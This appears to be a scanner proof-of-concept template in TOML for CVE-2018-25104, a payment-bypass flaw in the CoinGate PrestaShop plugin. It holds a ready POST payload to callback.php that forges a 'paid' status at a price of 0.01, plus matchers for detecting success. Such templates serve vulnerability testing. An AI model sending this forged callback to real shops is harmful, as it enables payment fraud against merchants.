[info]
id = "POC-AVE-2018-0033"
name = "CoinGate 支付回调订单状态绕过验证 PoC"
author = "AVE"
severity = "medium"
tags = ["business-logic", "payment-bypass", "coingate", "prestashop"]
description = "检测 CoinGate PrestaShop 支付插件 callback.php 中是否存在未校验 order_id 与 cart_id 一致性的业务逻辑缺陷，可伪造回调请求将订单标记为已支付"
vuln_id = ["CVE-2018-25104", "AVE-2018-0033"]

[poc]
logic = "any"

[[poc.requests]]
method = "POST"
path = "/modules/coingate/controllers/front/callback.php"
headers.Content-Type = "application/x-www-form-urlencoded"
headers.Connection = "close"
body.type = "form"
body.order_id = "1"
body.cart_id = "1"
body.status = "paid"
body.price = "0.01"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["PS_OS_PAYMENT", "payment", "success"]
expect = true
